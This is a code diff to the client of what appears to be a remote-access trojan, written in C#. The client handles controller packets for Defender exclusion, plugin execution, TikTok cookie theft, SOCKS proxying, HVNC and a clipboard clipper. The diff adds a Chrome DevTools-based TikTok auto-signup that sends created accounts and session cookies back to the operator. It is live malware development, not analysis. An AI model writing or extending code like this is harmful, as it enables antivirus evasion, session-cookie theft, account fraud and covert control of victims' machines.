@@ -235,9 +235,7 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.DefenderExclude:
-#pragma warning disable IL2026
                     _ = Task.Run(() => HandleDefenderExclude(packet.Data));
-#pragma warning restore IL2026
                     break;
 
                 case PacketType.PluginExec:
@@ -383,6 +381,31 @@ internal class TlsClient : IDisposable
                             Data = JsonSerializer.Serialize(
                                 new TikTokCookieResultStub { Cookie = c, Found = !string.IsNullOrEmpty(c) },
                                 SeroJson.Default.TikTokCookieResultStub)
+                        }, CancellationToken.None);
+                    });
+                    break;
+
+                // ── CDP Auto-Signup ──────────────────────────────────
+                case PacketType.CdpSignupStart:
+                    _ = Task.Run(async () =>
+                    {
+                        async Task SendStatus(string msg) =>
+                            await WritePacketAsync(new Packet
+                            {
+                                Type = PacketType.CdpSignupStatus,
+                                Data = JsonSerializer.Serialize(
+                                    new CdpSignupStatusStub { Step = "info", Message = msg },
+                                    SeroJson.Default.CdpSignupStatusStub)
+                            }, CancellationToken.None);
+
+                        var (ok, account, cookie, error) =
+                            await TikTokCdpFeature.RunAsync(SendStatus, CancellationToken.None);
+                        await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.CdpSignupResult,
+                            Data = JsonSerializer.Serialize(
+                                new CdpSignupResultStub { Success = ok, Account = account, Cookie = cookie, Error = error },
+                                SeroJson.Default.CdpSignupResultStub)
                         }, CancellationToken.None);
                     });
                     break;
@@ -646,7 +669,6 @@ internal class TlsClient : IDisposable
         }, ct);
     }
 
-    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
     private static void HandleDefenderExclude(string path)
     {
         string excludeDir;
@@ -1394,6 +1416,9 @@ internal enum PacketType
     TikTokCommentAck   = 211,
     TikTokDetectCookie = 212,
     TikTokCookieResult = 213,
+    CdpSignupStart     = 220,
+    CdpSignupStatus    = 221,
+    CdpSignupResult    = 222,
 
     SocksStart   = 200,
     SocksStop    = 201,
@@ -1597,4 +1622,10 @@ internal class HvncClipboardDataStub
 [JsonSerializable(typeof(ClipperConfig))]
 [JsonSerializable(typeof(ClipperDetectedStub))]
 [JsonSerializable(typeof(ClipperStatsResultStub))]
+// CDP Signup
+[JsonSerializable(typeof(CdpSignupStatusStub))]
+[JsonSerializable(typeof(CdpSignupResultStub))]
 internal partial class SeroJson : JsonSerializerContext { }
+
+internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
+internal class CdpSignupResultStub  { public bool Success { get; set; } public string Account { get; set; } = ""; public string Cookie { get; set; } = ""; public string Error { get; set; } = ""; }
